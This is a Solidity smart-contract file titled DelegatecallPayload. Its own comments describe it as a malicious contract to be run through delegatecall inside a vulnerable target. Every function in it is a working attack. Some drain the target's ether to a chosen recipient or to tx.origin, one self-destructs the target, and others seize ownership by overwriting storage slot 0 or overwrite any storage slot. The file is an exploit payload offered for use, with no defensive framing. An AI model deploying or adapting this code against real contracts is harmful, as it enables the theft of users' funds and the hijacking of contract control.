// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DelegatecallPayload
 * @notice Malicious contract to be executed via delegatecall in target's context
 * @dev This exploits delegatecall to drain all funds from vulnerable contracts
 */
contract DelegatecallPayload {
    
    /**
     * @notice Drain all ETH from the calling contract to specified recipient
     * @param recipient The address to send the drained funds to
     */
    function drain(address payable recipient) external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = recipient.call{value: balance}("");
            require(success, "Transfer failed");
        }
    }
    
    /**
     * @notice Alternative drain function that doesn't require parameters
     * @dev Sends to tx.origin (the original caller)
     */
    function emergencyDrain() external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = payable(tx.origin).call{value: balance}("");
            require(success, "Transfer failed");
        }
    }
    
    /**
     * @notice Destroy the calling contract and send funds to recipient
     * @param recipient The address to send the funds to
     */
    function destroyVault(address payable recipient) external {
        selfdestruct(recipient);
    }
    
    /**
     * @notice Change owner if possible (for contracts with owner storage at slot 0)
     * @param newOwner The new owner address
     */
    function changeOwner(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }
    
    /**
     * @notice Generic storage overwrite
     * @param slot Storage slot to overwrite
     * @param value Value to write
     */
    function overwriteStorage(uint256 slot, uint256 value) external {
        assembly {
            sstore(slot, value)
        }
    }
}